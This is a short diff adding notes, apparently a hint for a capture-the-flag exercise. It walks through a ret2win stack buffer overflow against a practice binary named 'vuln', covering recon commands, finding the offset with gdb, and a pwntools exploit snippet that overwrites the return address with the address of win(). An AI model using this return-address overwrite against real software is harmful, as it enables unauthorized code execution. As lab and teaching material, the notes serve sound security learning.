@@ -1,0 +1,12 @@
+- Recon: `file vuln`, `checksec vuln` (expect No PIE, No canary), `nm vuln | grep win`.
+- Use the gdb MCP to find the offset from the buffer to the saved return
+  address (send a cyclic pattern, see what overwrites RIP). It should be small
+  (the buffer is 64 bytes).
+- Target = address of win() (fixed, since No PIE) — `nm`/`objdump -d` or gdb.
+- Exploit with pwntools:
+    from pwn import *
+    e = ELF("./vuln"); p = process("./vuln")
+    p.send(b"A"*OFFSET + p64(e.symbols["win"])); print(p.recvall())
+- Stack-alignment gotcha: if you crash inside a libc call (movaps), prepend a
+  bare `ret` gadget (`ROP(e).find_gadget(["ret"])`) before win() to realign.
+- The input is read with read(2), so raw bytes are fine (no newline trimming).
